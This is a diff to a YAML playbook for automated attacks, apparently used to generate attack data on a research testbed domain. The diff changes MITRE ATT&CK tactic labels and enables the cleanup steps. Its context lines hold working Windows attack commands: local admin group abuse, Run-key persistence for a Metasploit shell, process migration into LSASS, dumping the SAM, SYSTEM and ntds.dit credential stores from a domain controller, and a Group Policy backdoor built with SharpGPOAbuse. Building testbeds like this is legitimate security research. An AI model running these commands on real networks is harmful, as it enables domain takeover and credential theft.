@@ -28,7 +28,7 @@ commands:
     cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
     metadata:
       techniques: "T1053.005"
-      tactics: "Execution, Persistence, Privilege Escalation"
+      tactics: "Privilege Escalation"
       technique_name: "Scheduled Task/Job: Scheduled Task"
 
   - type: sleep
@@ -53,7 +53,7 @@ commands:
     cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msfshell.exe\" -PropertyType \"String\" -Force\n"
     metadata:
       techniques: "T1547.001"
-      tactics: "Persistence, Privilege Escalation"
+      tactics: "Persistence"
       technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
 
   - type: msf-module
@@ -96,7 +96,7 @@ commands:
     cmd: migrate $LSASS_PID
     metadata:
       techniques: "T1055"
-      tactics: "Defense Evasion, Privilege Escalation"
+      tactics: "Defense Evasion"
       technique_name: "Process Injection"
 
   - type: sleep
@@ -184,7 +184,7 @@ commands:
     cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive /y; reg.exe save HKLM\\SAM C:\\Users\\Public\\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String \"Shadow Copy Volume:\" | Select-Object -First 1).ToString().Split(\":\")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\\Windows\\NTDS\\ntds.dit c:\\Users\\Public\\ntds.dit; vssadmin delete shadows /All /Quiet }\n"
     metadata:
       techniques: "T1006"
-      tactics: "Defense Evasion"
+      tactics: "Defense Evasion, Credential Access"
       technique_name: "Direct Volume Access"
 
 ### Invoke-Ninjacopy seems to be broken :(
@@ -256,21 +256,21 @@ commands:
     cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
     metadata:
       techniques: "T1484.001"
-      tactics: "Defense Evasion, Privilege Escalation"
+      tactics: "Persistence, Defense Evasion"
       technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
 
     # Optional: Cleanup DC1
-#  - type: shell
-#    session: winrm_domain_admin
-#    interactive: true
-#    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
 
     # Optional: Cleanup WEB
-#  - type: shell
-#    session: winrm_domain_admin
-#    interactive: true
-#    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"
 
     # Optional: Cleanup KALI
-#  - type: shell
-#    cmd: rm *.hive *.dit
+  - type: shell
+    cmd: rm *.hive *.dit
